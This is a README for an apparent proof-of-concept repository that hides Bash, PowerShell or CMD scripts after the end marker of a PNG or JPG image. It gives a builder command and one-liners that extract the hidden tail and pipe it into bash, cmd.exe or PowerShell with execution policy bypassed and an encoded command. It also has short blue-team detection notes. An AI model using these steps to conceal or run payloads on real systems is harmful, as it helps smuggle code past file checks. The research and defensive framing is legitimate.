# From Cat Photo to Shell: Polyglot File PoC for Linux & Windows

A **polyglot file** is a single file that is valid in **two formats at once**.  
Example: a `.png`/`.jpg` that opens normally as an image but also contains a script appended after a marker.

This repo demonstrates a **cross‑platform PoC**: create an image that stays a valid picture **and** embeds a script (Bash / PowerShell / CMD). The payload is extracted with a **single one‑liner**—no helper binaries, no external tools beyond what’s already on the OS.

> ⚠️ **Ethical use only**. This PoC is for defensive research and education. Do not use to conceal malicious payloads or violate policy/law.

---

## 🧠 How it works (short)
Many image parsers ignore bytes after the end marker (e.g., PNG `IEND`). We place a line with the marker:

```
__lolz__
```

…then append plain‑text script bytes. The image viewer stops at `IEND` and renders the picture. The one‑liner extracts **everything after `__lolz__`** and feeds it to the right interpreter.

---

## ⚡ Quick Start

1) **Build a polyglot**
```bash
python3 make_polyglot.py
```
- The script lists `.png` / `.jpg` / `.jpeg` in the current folder for quick selection.
- Choose payload type: `bash`, `powershell`, or `cmd`.
- Paste your script (or just press Enter for a Hello‑World default).
- Output: `*_polyglot.png` or `*_polyglot.jpg`.

2) **Run the embedded payload (copy one line)**

**Bash payload (Linux/macOS):**
```bash
awk 'f{print} /^__lolz__$/ {f=1; next}' FILE | bash
```

**CMD payload (Windows, Batch):**
```powershell
$s=(Get-Content -Raw "FILE") -split "`r?`n"; $i=[Array]::IndexOf($s,"__lolz__"); ($s[($i+1)..($s.Length-1)] -join "`r`n") | cmd.exe /Q
```

**PowerShell payload (Windows – robust, no hang):**
```powershell
$f="FILE";$b=[IO.File]::ReadAllBytes($f);$m=[Text.Encoding]::ASCII.GetBytes("`n__lolz__`n");$i=-1;for($p=0;$p -le $b.Length-$m.Length;$p++){ $ok=$true;for($k=0;$k -lt $m.Length;$k++){ if($b[$p+$k] -ne $m[$k]){$ok=$false;break} } if($ok){$i=$p;break} } if($i -lt 0){throw "Marker not found"};$tail=[Text.Encoding]::UTF8.GetString($b,$i+$m.Length,$b.Length-$i-$m.Length);$enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($tail));powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc
```

Replace `FILE` with your `*_polyglot.png` / `*.jpg` path.


---

## 🔍 Blue‑Team Notes
- Don’t trust file extensions; parse magic and **inspect tail bytes**.
- Useful tools: `file`, `xxd`, `binwalk`, hex viewers, detonation sandboxes.
- Consider **Content Disarm & Reconstruction (CDR)** to normalize images (strip trailing data).

---

## ⚠️ Disclaimer
This repository is for **educational and defensive research**. The author(s) assume no liability for misuse.
